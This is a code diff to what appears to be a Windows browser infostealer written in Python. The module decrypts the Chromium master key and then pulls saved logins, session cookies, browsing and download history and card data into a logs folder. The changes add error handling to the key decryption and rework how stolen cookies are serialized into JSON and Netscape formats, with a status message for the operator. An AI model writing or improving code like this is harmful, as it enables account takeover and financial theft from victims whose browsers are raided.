@@ -12,7 +12,8 @@ from datetime import datetime, timedelta
 from preferences.config import config
 
 logins = ''''''
-cookies = []
+cookies = ''''''
+cookies_list = []
 history = ''''''
 downhistory = ''''''
 cards = ''''''
@@ -28,7 +29,7 @@ class Types:
             self.value = value
             self.expires = expires
 
-        def __str__(self):
+        def to_netscape(self):
             return f'{self.host}\t{"FALSE" if self.expires == 0 else "TRUE"}\t{self.path}\t{"FALSE" if self.host.startswith(".") else "TRUE"}\t{self.expires}\t{self.name}\t{self.value}'
 
         def to_dict(self):
@@ -41,6 +42,9 @@ class Types:
                 "httpOnly": not self.expires == 0,
                 "secure": not self.host.startswith(".")
             }
+        
+        def __str__(self):
+            return json.dumps(self.to_dict())
     
     class Login:
         def __init__(self, url, username, password):
@@ -102,10 +106,12 @@ def get_master_key(path: str):
     if 'os_crypt' not in c:
         return None
     local_state = json.loads(c)
-    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    master_key = master_key[5:]
-    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
-    return master_key
+    master_key = b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
+    try:
+        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
+        return master_key
+    except Exception: return None
+        
 
 def decrypt_password(buff: bytes, master_key: bytes) -> str:
     try:
@@ -196,8 +202,9 @@ def get_downloads(path, blink = False):
         Log(f"{path} downhistory ---> {e}")
 
 def get_cookies(path, master_key, blink = False):
+    global cookies
+    global cookies_list
     try:
-        global cookies
         if not blink:
             num = path.rfind("\\")
             profile = path[num+1:]
@@ -214,7 +221,10 @@ def get_cookies(path, master_key, blink = False):
 
             cookie_value = decrypt_password(row[3], master_key)
             cookie_line = Types.Cookie(row[0], row[1], row[2], cookie_value, row[4])
-            cookies.append(cookie_line.to_dict())
+            cookies_list.append(str(cookie_line))
+
+        cookies += '[\n\t' + ',\n\t'.join(cookies_list) + '\n]\n'
+        cookies_list.clear()
         
         conn.close()
         try: remove(environ['USERPROFILE']+ '\\AppData\\Local\\Temp\\cwincache.db')
@@ -308,7 +318,7 @@ def Write(pathToLogs, browser):
     
     if (cookies):
         with open(rf"{pathToLogs}\\{browser}\\cookies.txt", "w", encoding="utf-8") as f:
-            f.write(json.dumps(cookies, indent=2))
+            f.write(cookies)
         msgInfo+="\n∟🍪cookies"
     
     if (autofills):
